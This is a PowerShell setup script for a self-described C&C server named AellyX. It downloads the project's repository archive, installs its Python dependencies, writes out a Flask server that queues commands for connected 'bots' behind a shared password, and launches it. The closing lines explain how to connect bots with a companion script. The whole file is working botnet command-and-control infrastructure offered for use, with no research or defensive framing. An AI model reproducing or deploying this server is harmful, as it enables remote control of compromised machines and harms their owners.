# AellyX Server Setup Script
# Run this on your VPS to start the C&C server
# Usage: .\setup_server.ps1 -HostIP "0.0.0.0" -Port 5261 -Password "your-password"

param(
    [string]$HostIP = "0.0.0.0",
    [int]$Port = 5261,
    [Parameter(Mandatory = $true)]
    [string]$Password
)

$InstallPath = "$env:LOCALAPPDATA\AellyX"
$RepoUrl = "https://github.com/k4ran909/AellyX/archive/refs/heads/main.zip"

Write-Host "========================================" -ForegroundColor Cyan
Write-Host "   AellyX C&C Server Setup" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# Check for Python
Write-Host "[1/4] Checking for Python..." -ForegroundColor Yellow
$python = Get-Command python -ErrorAction SilentlyContinue
if (-not $python) {
    Write-Host "Python is not installed." -ForegroundColor Red
    exit 1
}
Write-Host "      Python found" -ForegroundColor Green

# Create installation directory
Write-Host "[2/4] Setting up directory..." -ForegroundColor Yellow
if (-not (Test-Path $InstallPath)) {
    New-Item -ItemType Directory -Path $InstallPath -Force | Out-Null
    
    # Download AellyX
    $zipPath = "$env:TEMP\aellyx.zip"
    Invoke-WebRequest -Uri $RepoUrl -OutFile $zipPath
    Expand-Archive -Path $zipPath -DestinationPath $InstallPath -Force
    Move-Item "$InstallPath\AellyX-main\*" $InstallPath -Force
    Remove-Item "$InstallPath\AellyX-main" -Force
    Remove-Item $zipPath -Force
    
    # Setup venv
    Push-Location $InstallPath
    python -m venv .venv
    & "$InstallPath\.venv\Scripts\pip.exe" install -r requirements.txt -q
    Pop-Location
}
Write-Host "      Ready" -ForegroundColor Green

# Create server launcher
Write-Host "[3/4] Creating server launcher..." -ForegroundColor Yellow

$serverScript = @"
# AellyX C&C Server
import sys
sys.path.insert(1, "./AellyX/")

import flask
from flask import request

HOST = "$HostIP"
PORT = $Port
PASSWORD = "$Password"

data = {"agreed": False, "commands": [""]}
app = flask.Flask("AellyX-Server")

@app.route('/get/com<pos>', methods=["GET", "POST"])
def command_get(pos=0):
    if request.form.get('password') == PASSWORD:
        try:
            return str(data["commands"][int(pos)])
        except:
            return "500"
    return "Invalid Password"

@app.route('/get/agreed', methods=["GET", "POST"])
def agreed_get():
    if request.form.get('password') == PASSWORD:
        return str(data["agreed"])
    return "Invalid Password"

@app.route('/set/com', methods=["GET", "POST"])
def command_set():
    if request.form.get('password') == PASSWORD:
        cmd = request.form.get("data", "")
        data["commands"].append(cmd)
        print(f"[CMD] Received: {cmd}")
        return "200"
    return "Invalid Password"

@app.route('/set/agreed', methods=["GET", "POST"])
def agreed_set():
    if request.form.get('password') == PASSWORD:
        data["agreed"] = request.form.get("data")
        print(f"[AGREED] Set to: {data['agreed']}")
        return "200"
    return "Invalid Password"

@app.route('/reset', methods=["GET", "POST"])
def reset_data():
    global data
    if request.form.get('password') == PASSWORD:
        data = {"agreed": False, "commands": [""]}
        print("[RESET] Data cleared")
        return "200"
    return "Invalid Password"

@app.route('/status', methods=["GET"])
def status():
    return f"AellyX Server Running | Commands: {len(data['commands'])} | Agreed: {data['agreed']}"

if __name__ == "__main__":
    print("=" * 50)
    print("AellyX C&C Server")
    print(f"Host: {HOST}:{PORT}")
    print(f"Password: {PASSWORD}")
    print("=" * 50)
    print("")
    print("Bot connection URL: http://<your-public-ip>:{PORT}/")
    print("")
    app.run(host=HOST, port=PORT, use_reloader=False)
"@

$serverScript | Out-File -FilePath "$InstallPath\cc_server.py" -Encoding utf8
Write-Host "      Server launcher created" -ForegroundColor Green

# Create batch file
$batchContent = @"
@echo off
cd /d "$InstallPath"
call .venv\Scripts\activate.bat
python cc_server.py
pause
"@
$batchContent | Out-File -FilePath "$InstallPath\run_server.bat" -Encoding ascii

Write-Host "[4/4] Starting server..." -ForegroundColor Yellow
Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host "   Server Ready!" -ForegroundColor Green
Write-Host "========================================" -ForegroundColor Green
Write-Host ""
Write-Host "Server will listen on: http://${HostIP}:${Port}/" -ForegroundColor White
Write-Host "Password: $Password" -ForegroundColor White
Write-Host ""
Write-Host "For bots to connect, use:" -ForegroundColor Yellow
Write-Host "   .\setup_bot.ps1 -ServerUrl 'http://<your-vps-ip>:${Port}/' -Password '$Password'" -ForegroundColor Cyan
Write-Host ""

# Start the server
Push-Location $InstallPath
& "$InstallPath\.venv\Scripts\python.exe" cc_server.py
Pop-Location
